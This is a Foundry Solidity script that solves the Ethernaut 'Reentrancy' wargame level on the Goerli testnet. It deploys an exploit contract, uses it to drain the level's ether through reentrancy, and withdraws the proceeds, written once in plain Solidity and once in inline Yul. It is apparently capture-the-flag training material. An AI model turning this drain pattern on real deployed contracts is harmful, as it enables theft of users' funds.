// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { ReentrancyExploit } from "../../contracts/10_Reentrancy.sol";

interface Instance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract ReentrancyScript is EthernautScript {
    string network = "goerli";
    address level = 0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0.001 ether));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        ReentrancyExploit exploit = new ReentrancyExploit();

        uint256 amount = address(instance).balance;
        instance.donate{ value: amount }(address(exploit));
        exploit.exploit(address(instance), amount);

        require(address(instance).balance == 0);
        require(address(exploit).balance == amount * 2);

        uint256 balanceBefore = player.balance;
        exploit.withdraw();
        uint256 balanceAfter = player.balance;
        require(address(exploit).balance == 0);
        require(balanceAfter - balanceBefore == amount * 2);
    }

    function yulVersion() internal {
        bytes memory initCode = type(ReentrancyExploit).creationCode;

        assembly {
            let exploit := create(0, add(initCode, 0x20), mload(initCode))
            let amount := balance(sload(instance.slot))

            mstore(0, "donate(address)")
            mstore(0, keccak256(0, 15))
            mstore(4, exploit)
            let success := call(gas(), sload(instance.slot), amount, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            let fmp := mload(0x40)
            mstore(fmp, "exploit(address,uint256)")
            mstore(fmp, keccak256(fmp, 24))
            mstore(add(fmp, 4), sload(instance.slot))
            mstore(add(fmp, 0x24), amount)
            success := call(gas(), exploit, 0, fmp, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // check balances
            if iszero(eq(balance(sload(instance.slot)), 0)) {
                revert(0, 0)
            }
            if iszero(eq(balance(exploit), mul(amount, 2))) {
                revert(0, 0)
            }
            let balanceBefore := balance(sload(player.slot))

            mstore(0, "withdraw()")
            mstore(0, keccak256(0, 10))
            success := call(gas(), exploit, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // check balances
            let balanceAfter := balance(sload(player.slot))
            if iszero(eq(sub(balanceAfter, balanceBefore), mul(amount, 2))) {
                revert(0, 0)
            }
            if iszero(eq(balance(exploit), 0)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
